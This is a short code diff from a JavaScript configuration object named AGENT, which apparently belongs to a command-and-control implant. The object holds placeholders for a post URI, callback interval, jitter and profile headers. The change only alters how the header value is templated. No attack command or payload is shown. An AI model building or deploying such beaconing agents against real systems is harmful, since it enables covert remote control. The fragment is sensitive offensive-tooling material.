@@ -11,7 +11,7 @@ var AGENT = {
     post_uri: "__POST_URI__",
     callback_interval: parseInt("__CALLBACK_INTERVAL__", 10),
     callback_jitter: parseInt("__CALLBACK_JITTER__", 10),
-    profile_headers: ("__PROFILE_HEADERS__"),
+    profile_headers: __PROFILE_HEADERS__,
     jobs: {}
 };
 
